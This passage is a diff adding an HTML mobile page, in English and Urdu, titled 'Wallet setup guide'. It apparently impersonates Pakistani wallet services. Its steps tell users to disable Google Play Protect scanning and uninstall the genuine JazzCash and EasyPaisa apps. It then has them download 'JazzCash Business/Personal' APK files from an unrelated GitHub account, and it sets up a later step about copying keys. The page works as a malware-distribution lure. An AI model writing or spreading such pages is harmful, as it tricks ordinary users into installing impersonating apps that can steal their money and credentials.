@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#2563EB">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>Wallet setup guide</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&family=Noto+Nastaliq+Urdu:wght@500;700&display=swap" rel="stylesheet">
+<style>
+  html {
+    -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: transparent;
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --primary: #2563EB;
+    --primary-dark: #1D4ED8;
+    --primary-soft: #EFF6FF;
+    --accent: #F59E0B;
+    --danger: #EF4444;
+    --danger-soft: #FEE2E2;
+    --text: #111827;
+    --text2: #4B5563;
+    --text3: #9CA3AF;
+    --line: #E5E7EB;
+    --card: #FFFFFF;
+    --page: #F3F4F6;
+    --font: "Manrope", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    --font-urdu: "Noto Nastaliq Urdu", Tahoma, serif;
+    --font-latin: "Manrope", -apple-system, BlinkMacSystemFont, sans-serif;
+    --gg-green: #34A853;
+    --field: #F3F6FA;
+    --faint: #9CA3AF;
+  }
+
+  html[lang="ur"] { --font: var(--font-urdu); }
+
+  body {
+    font-family: var(--font);
+    font-size: 0.28rem;
+    line-height: 1.55;
+    color: var(--text);
+    background: var(--page);
+    min-height: 100vh;
+    min-height: 100dvh;
+    overflow-x: hidden;
+    touch-action: manipulation;
+  }
+  html[lang="ur"] body { line-height: 1.85; }
+
+  .h5 {
+    width: 100%;
+    max-width: 7.5rem;
+    margin: 0 auto;
+    min-height: 100dvh;
+    padding-bottom: calc(0.4rem + env(safe-area-inset-bottom, 0px));
+  }
+
+  /* Top bar */
+  .topbar {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    height: calc(0.88rem + env(safe-area-inset-top, 0px));
+    padding: env(safe-area-inset-top, 0px) 0.24rem 0;
+    background: rgba(255,255,255,.96);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--line);
+  }
+  .topbar .title {
+    flex: 1;
+    text-align: center;
+    font-size: 0.32rem;
+    font-weight: 700;
+    padding: 0 0.16rem;
+  }
+  .topbar .back {
+    width: 0.72rem;
+    height: 0.72rem;
+    border: 0;
+    background: transparent;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--text);
+  }
+  html[lang="ur"] .topbar .back svg { transform: scaleX(-1); }
+  .lang {
+    display: flex;
+    gap: 0.04rem;
+    background: var(--page);
+    border-radius: 999px;
+    padding: 0.04rem;
+  }
+  .lang button {
+    border: 0;
+    background: transparent;
+    min-width: 0.56rem;
+    height: 0.52rem;
+    padding: 0 0.12rem;
+    border-radius: 999px;
+    font-size: 0.22rem;
+    font-weight: 700;
+    font-family: inherit;
+    color: var(--text2);
+  }
+  .lang button[aria-pressed="true"] {
+    background: var(--card);
+    color: var(--primary);
+    box-shadow: 0 1px 4px rgba(0,0,0,.08);
+  }
+
+  /* Hero */
+  .hero {
+    margin: 0.24rem;
+    padding: 0.4rem 0.32rem;
+    border-radius: 0.24rem;
+    background: linear-gradient(135deg, #3B82F6 0%, #2563EB 50%, #1D4ED8 100%);
+    color: #fff;
+    box-shadow: 0 0.16rem 0.4rem -0.08rem rgba(37,99,235,.45);
+  }
+  .hero h1 {
+    font-size: 0.44rem;
+    font-weight: 900;
+    line-height: 1.25;
+    margin-bottom: 0.16rem;
+  }
+  html[lang="ur"] .hero h1 { font-weight: 700; font-size: 0.4rem; }
+  .hero p { font-size: 0.26rem; opacity: .92; line-height: 1.5; }
+  .hero-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.12rem;
+    margin-top: 0.24rem;
+  }
+  .hero-tags span {
+    font-size: 0.22rem;
+    font-weight: 600;
+    padding: 0.08rem 0.2rem;
+    border-radius: 999px;
+    background: rgba(255,255,255,.22);
+  }
+
+  /* Phase nav */
+  .phase-nav {
+    position: sticky;
+    top: calc(0.88rem + env(safe-area-inset-top, 0px));
+    z-index: 90;
+    background: var(--page);
+    padding: 0.16rem 0 0.2rem;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    scrollbar-width: none;
+  }
+  .phase-nav::-webkit-scrollbar { display: none; }
+  .phase-nav-inner {
+    display: flex;
+    gap: 0.16rem;
+    padding: 0 0.24rem;
+    width: max-content;
+    min-width: 100%;
+  }
+  .phase-nav a {
+    flex: 1;
+    min-width: 1.56rem;
+    text-decoration: none;
+    text-align: center;
+    padding: 0.2rem 0.16rem;
+    border-radius: 0.16rem;
+    background: var(--card);
+    border: 1px solid var(--line);
+    color: var(--text2);
+    font-size: 0.22rem;
+    font-weight: 600;
+    line-height: 1.3;
+  }
+  .phase-nav a .n {
+    display: block;
+    font-size: 0.32rem;
+    font-weight: 900;
+    color: var(--primary);
+    font-family: -apple-system, sans-serif;
+    margin-bottom: 0.04rem;
+  }
+
+  /* Blocks */
+  .main { padding: 0 0.24rem; }
+  .block {
+    margin-bottom: 0.24rem;
+    background: var(--card);
+    border-radius: 0.24rem;
+    overflow: hidden;
+    box-shadow: 0 2px 12px rgba(17,24,39,.04);
+  }
+  .block-hd {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.2rem;
+    padding: 0.28rem 0.28rem 0.2rem;
+    border-bottom: 1px solid var(--line);
+    background: linear-gradient(180deg, var(--primary-soft) 0%, #fff 100%);
+  }
+  .block-hd .badge {
+    flex: none;
+    width: 0.72rem;
+    height: 0.72rem;
+    border-radius: 0.16rem;
+    background: var(--primary);
+    color: #fff;
+    font-size: 0.3rem;
+    font-weight: 900;
+    font-family: -apple-system, sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .block-hd h2 { font-size: 0.32rem; font-weight: 800; line-height: 1.35; }
+  html[lang="ur"] .block-hd h2 { font-weight: 700; }
+  .block-hd .sub { font-size: 0.24rem; color: var(--text2); margin-top: 0.06rem; }
+
+  /* Phase 1: Play Protect timeline + UI mocks */
+  .pp-guide { padding: 0.12rem 0.2rem 0.08rem; }
+  .pp-guide .tl {
+    display: grid;
+    grid-template-columns: 0.76rem 1fr;
+    gap: 0.2rem;
+  }
+  .pp-guide .rail { display: flex; flex-direction: column; align-items: center; }
+  .pp-guide .rail .num {
+    width: 0.76rem; height: 0.76rem; border-radius: 50%;
+    background: linear-gradient(118deg, #1A73E8, #4285F4);
+    color: #fff; font-family: var(--font-latin); font-size: 0.32rem; font-weight: 800;
+    display: flex; align-items: center; justify-content: center; flex: none;
+    box-shadow: 0 0.12rem 0.28rem -0.14rem #4285F4;
+  }
+  .pp-guide .rail .line {
+    flex: 1; width: 0.04rem; min-height: 0.32rem; margin-top: 0.08rem;
+    background: linear-gradient(#4285F4, var(--line));
+  }
+  .pp-guide .tl:last-child .rail .line { display: none; }
+  .pp-guide .step { padding-bottom: 0.4rem; }
+  .pp-guide .step .k {
+    font-size: 0.22rem; font-weight: 700; color: #1A73E8;
+    font-family: var(--font-latin); letter-spacing: 0.02rem; text-transform: uppercase;
+  }
+  html[lang="ur"] .pp-guide .step .k { font-family: inherit; text-transform: none; letter-spacing: 0; }
+  .pp-guide .step h3 { margin: 0.04rem 0 0.08rem; font-size: 0.3rem; font-weight: 800; line-height: 1.35; }
+  html[lang="ur"] .pp-guide .step h3 { font-weight: 700; }
+  .pp-guide .step .desc { margin: 0 0 0.2rem; font-size: 0.24rem; color: var(--text2); line-height: 1.45; }
+
+  .pp-guide .shot {
+    border-radius: 0.24rem; border: 1px solid #E6EBF1; background: #F7F9FC;
+    padding: 0.24rem; box-shadow: 0 0.12rem 0.4rem -0.28rem rgba(20,40,60,.45);
+  }
+  .pp-guide .cap {
+    margin-top: 0.2rem; display: inline-flex; align-items: center; gap: 0.12rem;
+    font-size: 0.22rem; font-weight: 700; color: var(--danger); background: var(--danger-soft);
+    border-radius: 0.12rem; padding: 0.12rem 0.2rem;
+  }
+  .pp-guide .cap svg { width: 0.3rem; height: 0.3rem; flex: none; }
+  .pp-guide .ring { outline: 0.05rem solid var(--danger); outline-offset: 0.04rem; border-radius: 0.16rem; }
+  .pp-guide .ring-c { outline: 0.05rem solid var(--danger); outline-offset: 0.06rem; border-radius: 50%; }
+
+  .pp-guide .ps-launch { display: flex; flex-direction: column; align-items: center; gap: 0.16rem; padding: 0.24rem 0 0.12rem; }
+  .pp-guide .ps-icon {
+    width: 1.32rem; height: 1.32rem; border-radius: 0.32rem; background: #fff;
+    box-shadow: 0 0.12rem 0.32rem -0.16rem rgba(20,40,60,.4);
+    display: flex; align-items: center; justify-content: center;
+  }
+  .pp-guide .ps-icon svg { width: 0.68rem; height: 0.68rem; }
+  .pp-guide .ps-name { font-family: var(--font-latin); font-size: 0.26rem; font-weight: 700; color: #3A4650; }
+
+  .pp-guide .scr { background: #fff; border-radius: 0.2rem; overflow: hidden; border: 1px solid #EDF0F4; }
+  .pp-guide .scr-bar { display: flex; align-items: center; gap: 0.16rem; padding: 0.2rem 0.24rem; }
+  .pp-guide .scr-search {
+    flex: 1; height: 0.68rem; border-radius: 999px; background: var(--field);
+    display: flex; align-items: center; padding: 0 0.24rem; gap: 0.12rem;
+    color: var(--faint); font-size: 0.24rem; font-family: var(--font-latin);
+  }
+  .pp-guide .scr-search svg { width: 0.3rem; height: 0.3rem; }
+  .pp-guide .ava {
+    width: 0.6rem; height: 0.6rem; border-radius: 50%; flex: none;
+    background: conic-gradient(from 210deg, #8AB4F8, #4285F4, #1557B0);
+  }
+
+  .pp-guide .dd { background: #fff; border-radius: 0.24rem; overflow: hidden; border: 1px solid #EDF0F4; }
+  .pp-guide .dd-head { display: flex; align-items: center; gap: 0.2rem; padding: 0.24rem; border-bottom: 1px solid #F0F3F6; }
+  .pp-guide .dd-head .ava { width: 0.76rem; height: 0.76rem; }
+  .pp-guide .dd-head .who { font-family: var(--font-latin); }
+  .pp-guide .dd-head .who .nm { font-size: 0.26rem; font-weight: 700; }
+  .pp-guide .dd-head .who .em { font-size: 0.22rem; color: var(--text2); }
+  .pp-guide .dd-item { display: flex; align-items: center; gap: 0.2rem; padding: 0.22rem 0.24rem; font-size: 0.26rem; font-weight: 600; font-family: var(--font-latin); }
+  .pp-guide .dd-item svg { width: 0.38rem; height: 0.38rem; color: var(--text2); flex: none; }
+  .pp-guide .dd-item.hot { color: #1557B0; }
+  .pp-guide .dd-item.hot svg { color: #1A73E8; }
+
+  .pp-guide .pp { background: #fff; border-radius: 0.24rem; overflow: hidden; border: 1px solid #EDF0F4; }
+  .pp-guide .pp-bar { display: flex; align-items: center; justify-content: space-between; padding: 0.2rem 0.24rem; border-bottom: 1px solid #F0F3F6; }
+  .pp-guide .pp-bar .ttl { font-family: var(--font-latin); font-weight: 700; font-size: 0.28rem; }
+  .pp-guide .pp-gear {
+    width: 0.64rem; height: 0.64rem; border-radius: 50%; background: var(--field);
+    display: flex; align-items: center; justify-content: center;
+  }
+  .pp-guide .pp-gear svg { width: 0.36rem; height: 0.36rem; color: #3A4650; }
+  .pp-guide .pp-body { padding: 0.32rem 0.24rem; display: flex; flex-direction: column; align-items: center; gap: 0.16rem; text-align: center; }
+  .pp-guide .pp-shield {
+    width: 1.16rem; height: 1.16rem; border-radius: 50%; background: #E6F4EA;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .pp-guide .pp-shield svg { width: 0.6rem; height: 0.6rem; color: var(--gg-green); }
+  .pp-guide .pp-ok { font-family: var(--font-latin); font-size: 0.26rem; font-weight: 700; }
+  .pp-guide .pp-scan {
+    font-family: var(--font-latin); font-size: 0.26rem; font-weight: 700; color: #1A73E8;
+    border: 1px solid #D4E3FC; border-radius: 999px; padding: 0.12rem 0.36rem;
+  }
+
+  .pp-guide .set { background: #fff; border-radius: 0.24rem; overflow: hidden; border: 1px solid #EDF0F4; }
+  .pp-guide .set-row { display: flex; align-items: center; gap: 0.2rem; padding: 0.26rem 0.24rem; }
+  .pp-guide .set-row + .set-row { border-top: 1px solid #F3F5F8; }
+  .pp-guide .set-row .tx { flex: 1; min-width: 0; }
+  .pp-guide .set-row .tx .t { font-size: 0.26rem; font-weight: 700; font-family: var(--font-latin); line-height: 1.25; }
+  .pp-guide .set-row .tx .d { font-size: 0.22rem; color: var(--text2); margin-top: 0.04rem; font-family: var(--font-latin); }
+  .pp-guide .sw {
+    width: 0.84rem; height: 0.48rem; border-radius: 999px; flex: none; position: relative; background: var(--gg-green);
+  }
+  .pp-guide .sw.off { background: #C9D1DA; }
+  .pp-guide .sw::after {
+    content: ""; position: absolute; top: 0.06rem; inset-inline-start: 0.42rem;
+    width: 0.36rem; height: 0.36rem; border-radius: 50%; background: #fff;
+    box-shadow: 0 1px 2px rgba(0,0,0,.3);
+  }
+  .pp-guide .sw.off::after { inset-inline-start: 0.06rem; }
+
+  /* Wallet uninstall */
+  .wallet-row {
+    display: flex;
+    align-items: center;
+    gap: 0.2rem;
+    padding: 0.28rem;
+    border-bottom: 1px solid #F3F4F6;
+  }
+  .wallet-row:last-child { border-bottom: 0; }
+  .wlogo {
+    width: 0.96rem;
+    height: 0.96rem;
+    border-radius: 0.22rem;
+    object-fit: cover;
+    flex: none;
+    background: #fff;
+    box-shadow: 0 2px 8px rgba(0,0,0,.08);
+  }
+  .wallet-row .info { flex: 1; min-width: 0; }
+  .wallet-row .info .name { font-size: 0.3rem; font-weight: 800; }
+  .wallet-row .info .desc { font-size: 0.22rem; color: var(--text3); margin-top: 0.06rem; }
+  .pill-danger {
+    flex: none;
+    font-size: 0.22rem;
+    font-weight: 800;
+    color: var(--danger);
+    background: var(--danger-soft);
+    padding: 0.14rem 0.2rem;
+    border-radius: 0.12rem;
+  }
+
+  /* Download cards */
+  .dl-card { padding: 0.28rem; border-bottom: 1px solid #F3F4F6; }
+  .dl-card:last-child { border-bottom: 0; }
+  .dl-card-top { display: flex; align-items: center; gap: 0.2rem; margin-bottom: 0.24rem; }
+  .dl-card-top .info .name { font-size: 0.3rem; font-weight: 800; line-height: 1.3; }
+  .dl-card-top .info .file { font-size: 0.22rem; color: var(--text3); margin-top: 0.06rem; word-break: break-all; }
+  .btn-dl {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.12rem;
+    width: 100%;
+    min-height: 0.88rem;
+    border: 0;
+    border-radius: 0.2rem;
+    background: linear-gradient(135deg, #3B82F6, #2563EB);
+    color: #fff;
+    font-size: 0.3rem;
+    font-weight: 800;
+    text-decoration: none;
+    box-shadow: 0 0.12rem 0.28rem -0.08rem rgba(37,99,235,.55);
+  }
+  .btn-dl:active { opacity: .9; transform: scale(0.99); }
+  .btn-dl svg { width: 0.36rem; height: 0.36rem; }
+
+  .notice {
+    margin: 0 0.24rem 0.24rem;
+    padding: 0.24rem;
+    border-radius: 0.2rem;
+    background: #FFFBEB;
+    border: 1px solid #FDE68A;
+    display: flex;
+    gap: 0.16rem;
+    font-size: 0.24rem;
+    color: #92400E;
+    line-height: 1.45;
+  }
+  .notice svg { flex: none; width: 0.4rem; height: 0.4rem; color: var(--accent); }
+
+  .hint-box {
+    margin: 0 0.28rem 0.28rem;
+    padding: 0.2rem 0.24rem;
+    border-radius: 0.16rem;
+    background: var(--primary-soft);
+    font-size: 0.24rem;
+    color: var(--primary-dark);
+    line-height: 1.5;
+  }
+
+  /* Phase 4: copy key reference screenshots */
+  .key-guide { padding: 0.08rem 0.28rem 0.28rem; }
+  .key-wallet {
+    display: flex; align-items: center; gap: 0.2rem;
+    margin: 0.24rem 0 0.16rem; padding-bottom: 0.16rem;
+    border-bottom: 1px solid #F3F4F6;
+  }
+  .key-wallet .wlogo { width: 0.72rem; height: 0.72rem; border-radius: 0.18rem; }
+  .key-wallet h3 { font-size: 0.3rem; font-weight: 800; }
+  .key-fig { margin: 0 0 0.28rem; }
+  .key-fig img {
+    width: 100%; height: auto; display: block;
+    border-radius: 0.2rem; border: 1px solid var(--line);
+    background: #fff;
+  }
+  .key-fig figcaption {
+    margin-top: 0.14rem; font-size: 0.24rem; color: var(--text2); line-height: 1.45;
+  }
+  .key-fig .tag {
+    display: inline-block; margin-bottom: 0.1rem;
+    font-size: 0.22rem; font-weight: 800; color: var(--danger);
+    background: var(--danger-soft); padding: 0.06rem 0.14rem; border-radius: 0.08rem;
+  }
+
+  /* YouTube troubleshooting */
+  .yt-block { padding-bottom: 0.08rem; }
+  .yt-desc {
+    margin: 0 0.28rem 0.2rem; font-size: 0.24rem; color: var(--text2); line-height: 1.45;
+  }
+  .yt-wrap {
+    position: relative; width: auto; height: 0;
+    margin: 0 0.28rem 0.2rem; padding-bottom: 56.25%;
+    overflow: hidden; border-radius: 0.2rem;
+    background: #0f0f0f; border: 1px solid var(--line);
+  }
+  .yt-wrap iframe {
+    position: absolute; inset: 0; width: 100%; height: 100%; border: 0;
+  }
+  .btn-yt {
+    display: flex; align-items: center; justify-content: center; gap: 0.12rem;
+    margin: 0 0.28rem 0.28rem; min-height: 0.88rem;
+    border-radius: 0.2rem; background: #FF0000; color: #fff;
+    font-size: 0.28rem; font-weight: 800; text-decoration: none;
+    box-shadow: 0 0.12rem 0.28rem -0.08rem rgba(255,0,0,.45);
+  }
+  .btn-yt:active { opacity: .92; }
+  .btn-yt svg { width: 0.4rem; height: 0.4rem; flex: none; }
+</style>
+</head>
+<body>
+<div class="h5">
+  <header class="topbar">
+    <button type="button" class="back" id="back" aria-label="Back">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M19 12H5"/><path d="m12 19-7-7 7-7"/></svg>
+    </button>
+    <div class="title" data-i18n="navTitle"></div>
+    <div class="lang" role="group" aria-label="Language">
+      <button type="button" data-lang="en" aria-pressed="true">EN</button>
+      <button type="button" data-lang="ur" aria-pressed="false">اردو</button>
+    </div>
+  </header>
+
+  <section class="hero">
+    <h1 data-i18n="heroTitle"></h1>
+    <p data-i18n="heroSub"></p>
+    <div class="hero-tags">
+      <span data-i18n="chipDevice"></span>
+      <span data-i18n="chipTime"></span>
+    </div>
+  </section>
+
+  <nav class="phase-nav" aria-label="Phases">
+    <div class="phase-nav-inner">
+      <a href="#phase1"><span class="n">1</span><span data-i18n="navP1"></span></a>
+      <a href="#phase2"><span class="n">2</span><span data-i18n="navP2"></span></a>
+      <a href="#phase3"><span class="n">3</span><span data-i18n="navP3"></span></a>
+      <a href="#phase4"><span class="n">4</span><span data-i18n="navP4"></span></a>
+    </div>
+  </nav>
+
+  <main class="main">
+    <!-- Phase 1: Play Protect -->
+    <article class="block" id="phase1">
+      <div class="block-hd">
+        <div class="badge">1</div>
+        <div>
+          <h2 data-i18n="p1Title"></h2>
+          <p class="sub" data-i18n="p1Sub"></p>
+        </div>
+      </div>
+      <div class="pp-guide">
+        <div class="tl">
+          <div class="rail"><div class="num">1</div><div class="line"></div></div>
+          <div class="step">
+            <div class="k" data-i18n="step"></div>
+            <h3 data-i18n="s1Title"></h3>
+            <p class="desc" data-i18n="s1Desc"></p>
+            <div class="shot">
+              <div class="ps-launch">
+                <div class="ps-icon ring">
+                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 3.5 13.5 12 4 20.5Z" fill="#00C3FF"/><path d="M4 3.5 13.5 12 17 8.5Z" fill="#00E676"/><path d="M4 20.5 13.5 12 17 15.5Z" fill="#FF3D47"/><path d="M13.5 12 17 8.5l3.2 1.9c1.1.7 1.1 2.5 0 3.2L17 15.5Z" fill="#FFC400"/></svg>
+                </div>
+                <div class="ps-name">Google Play</div>
+              </div>
+              <div class="cap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="m9 18 6-6-6-6"/></svg><span data-i18n="s1Cap"></span></div>
+            </div>
+          </div>
+        </div>
+        <div class="tl">
+          <div class="rail"><div class="num">2</div><div class="line"></div></div>
+          <div class="step">
+            <div class="k" data-i18n="step"></div>
+            <h3 data-i18n="s2Title"></h3>
+            <p class="desc" data-i18n="s2Desc"></p>
+            <div class="shot">
+              <div class="scr">
+                <div class="scr-bar">
+                  <div class="scr-search"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m20 20-3-3"/></svg><span data-i18n="mSearch"></span></div>
+                  <div class="ava ring-c"></div>
+                </div>
+              </div>
+              <div class="cap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><circle cx="12" cy="8" r="4"/><path d="M4 20a8 8 0 0 1 16 0"/></svg><span data-i18n="s2Cap"></span></div>
+            </div>
+          </div>
+        </div>
+        <div class="tl">
+          <div class="rail"><div class="num">3</div><div class="line"></div></div>
+          <div class="step">
+            <div class="k" data-i18n="step"></div>
+            <h3 data-i18n="s3Title"></h3>
+            <p class="desc" data-i18n="s3Desc"></p>
+            <div class="shot">
+              <div class="dd">
+                <div class="dd-head"><div class="ava"></div><div class="who"><div class="nm">Your account</div><div class="em">you@gmail.com</div></div></div>
+                <div class="dd-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M4 20a8 8 0 0 1 16 0"/></svg> <span data-i18n="mManage"></span></div>
+                <div class="dd-item hot ring"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2 4 6v6c0 5 3.5 8 8 10 4.5-2 8-5 8-10V6Z"/><path d="m9 12 2 2 4-4"/></svg> Play Protect</div>
+                <div class="dd-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19 12a7 7 0 0 0-.1-1l2-1.5-2-3.5-2.3 1a7 7 0 0 0-1.7-1L16 2H8l-.9 2.5a7 7 0 0 0-1.7 1l-2.3-1-2 3.5L3 9a7 7 0 0 0 0 2l-2 1.5 2 3.5 2.3-1a7 7 0 0 0 1.7 1L8 22h8l.9-2.5a7 7 0 0 0 1.7-1l2.3 1 2-3.5-2-1.5c.1-.3.1-.7.1-1Z"/></svg> <span data-i18n="mSettings"></span></div>
+              </div>
+              <div class="cap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M12 2 4 6v6c0 5 3.5 8 8 10 4.5-2 8-5 8-10V6Z"/></svg><span data-i18n="s3Cap"></span></div>
+            </div>
+          </div>
+        </div>
+        <div class="tl">
+          <div class="rail"><div class="num">4</div><div class="line"></div></div>
+          <div class="step">
+            <div class="k" data-i18n="step"></div>
+            <h3 data-i18n="s4Title"></h3>
+            <p class="desc" data-i18n="s4Desc"></p>
+            <div class="shot">
+              <div class="pp">
+                <div class="pp-bar"><div class="ttl">Play Protect</div><div class="pp-gear ring-c"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 13a7.6 7.6 0 0 0 0-2l2-1.5-2-3.4-2.4 1a7.6 7.6 0 0 0-1.7-1L14.8 3H9.2l-.5 2.6a7.6 7.6 0 0 0-1.7 1l-2.4-1-2 3.4L4.6 11a7.6 7.6 0 0 0 0 2l-2 1.5 2 3.4 2.4-1a7.6 7.6 0 0 0 1.7 1l.5 2.6h5.6l.5-2.6a7.6 7.6 0 0 0 1.7-1l2.4 1 2-3.4Z"/></svg></div></div>
+                <div class="pp-body">
+                  <div class="pp-shield"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2 4 6v6c0 5 3.5 8 8 10 4.5-2 8-5 8-10V6Z"/><path d="m9 12 2 2 4-4"/></svg></div>
+                  <div class="pp-ok" data-i18n="mNoHarm"></div>
+                  <div class="pp-scan" data-i18n="mScan"></div>
+                </div>
+              </div>
+              <div class="cap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><circle cx="12" cy="12" r="3"/></svg><span data-i18n="s4Cap"></span></div>
+            </div>
+          </div>
+        </div>
+        <div class="tl">
+          <div class="rail"><div class="num">5</div></div>
+          <div class="step">
+            <div class="k" data-i18n="step"></div>
+            <h3 data-i18n="s5Title"></h3>
+            <p class="desc" data-i18n="s5Desc"></p>
+            <div class="shot">
+              <div class="set ring">
+                <div class="set-row">
+                  <div class="tx"><div class="t" data-i18n="mScanApps"></div><div class="d" data-i18n="mScanAppsD"></div></div>
+                  <div class="sw off" aria-hidden="true"></div>
+                </div>
+                <div class="set-row">
+                  <div class="tx"><div class="t" data-i18n="mImprove"></div><div class="d" data-i18n="mImproveD"></div></div>
+                  <div class="sw off" aria-hidden="true"></div>
+                </div>
+              </div>
+              <div class="cap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg><span data-i18n="s5Cap"></span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </article>
+
+    <article class="block yt-block" id="help-denied">
+      <div class="block-hd">
+        <div class="badge" aria-hidden="true">?</div>
+        <div>
+          <h2 data-i18n="ytDeniedTitle"></h2>
+          <p class="sub" data-i18n="ytDeniedSub"></p>
+        </div>
+      </div>
+      <p class="yt-desc" data-i18n="ytDeniedDesc"></p>
+      <div class="yt-wrap">
+        <iframe
+          title="How to fix App Was Denied Access on Android"
+          src="https://www.youtube.com/embed/CkMCCeTzyUI?rel=0&playsinline=1"
+          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+          allowfullscreen
+          loading="lazy"
+          referrerpolicy="strict-origin-when-cross-origin"></iframe>
+      </div>
+      <a class="btn-yt" href="https://www.youtube.com/watch?v=CkMCCeTzyUI" target="_blank" rel="noopener noreferrer">
+        <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M23.5 6.2a3 3 0 0 0-2.1-2.1C19.5 3.5 12 3.5 12 3.5s-7.5 0-9.4.6A3 3 0 0 0 .5 6.2 31 31 0 0 0 0 12a31 31 0 0 0 .5 5.8 3 3 0 0 0 2.1 2.1c1.9.6 9.4.6 9.4.6s7.5 0 9.4-.6a3 3 0 0 0 2.1-2.1 31 31 0 0 0 .5-5.8 31 31 0 0 0-.5-5.8zM9.8 15.6V8.4L15.8 12l-6 3.6z"/></svg>
+        <span data-i18n="ytWatch"></span>
+      </a>
+    </article>
+
+    <!-- Phase 2: Uninstall wallet -->
+    <article class="block" id="phase2">
+      <div class="block-hd">
+        <div class="badge">2</div>
+        <div>
+          <h2 data-i18n="p2Title"></h2>
+          <p class="sub" data-i18n="s6Desc"></p>
+        </div>
+      </div>
+      <div class="wallet-row">
+        <img class="wlogo" src="https://play-lh.googleusercontent.com/gxLZ7ouLFPXZQWvvUDvGtDyFeGjcGLgoR4xRvWC98QuMkhe-OOKiAT6f1oL3PwjM_jDKghVedUM-skYGWowJCio=w480-h960-rw" alt="JazzCash">
+        <div class="info">
+          <div class="name">JazzCash</div>
+          <div class="desc" data-i18n="mInstalled"></div>
+        </div>
+        <span class="pill-danger" data-i18n="mUninstall"></span>
+      </div>
+      <div class="wallet-row">
+        <img class="wlogo" src="https://play-lh.googleusercontent.com/NpYySXJS_VNGjzmNY8hrkyjRb9snboxwELc0WxBuRNi4YwN-lgc2cQqo57AwBUUI1Fd_sh5N1A8j28WkBAIHOw=w480-h960-rw" alt="EasyPaisa">
+        <div class="info">
+          <div class="name">EasyPaisa</div>
+          <div class="desc" data-i18n="mInstalled"></div>
+        </div>
+        <span class="pill-danger" data-i18n="mUninstall"></span>
+      </div>
+      <div class="hint-box" data-i18n="s6Cap"></div>
+    </article>
+
+    <!-- Phase 3: Download & sign in -->
+    <article class="block" id="phase3">
+      <div class="block-hd">
+        <div class="badge">3</div>
+        <div>
+          <h2 data-i18n="p3Title"></h2>
+          <p class="sub" data-i18n="s7Desc"></p>
+        </div>
+      </div>
+      <div class="dl-card">
+        <div class="dl-card-top">
+          <img class="wlogo" src="https://play-lh.googleusercontent.com/gxLZ7ouLFPXZQWvvUDvGtDyFeGjcGLgoR4xRvWC98QuMkhe-OOKiAT6f1oL3PwjM_jDKghVedUM-skYGWowJCio=w480-h960-rw" alt="">
+          <div class="info">
+            <div class="name">JazzCash Business</div>
+            <div class="file">jz_dp.apk</div>
+          </div>
+        </div>
+        <a class="btn-dl" href="https://github.com/indiapay23/apk/releases/download/PK/jz_dp.apk" rel="noopener">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/></svg>
+          <span data-i18n="mDownload"></span>
+        </a>
+      </div>
+      <div class="dl-card">
+        <div class="dl-card-top">
+          <img class="wlogo" src="https://play-lh.googleusercontent.com/gxLZ7ouLFPXZQWvvUDvGtDyFeGjcGLgoR4xRvWC98QuMkhe-OOKiAT6f1oL3PwjM_jDKghVedUM-skYGWowJCio=w480-h960-rw" alt="">
+          <div class="info">
+            <div class="name">JazzCash Personal</div>
+            <div class="file">jz_personal_dp.apk</div>
+          </div>
+        </div>
+        <a class="btn-dl" href="https://github.com/indiapay23/apk/releases/download/PK/jz_personal_dp.apk" rel="noopener">
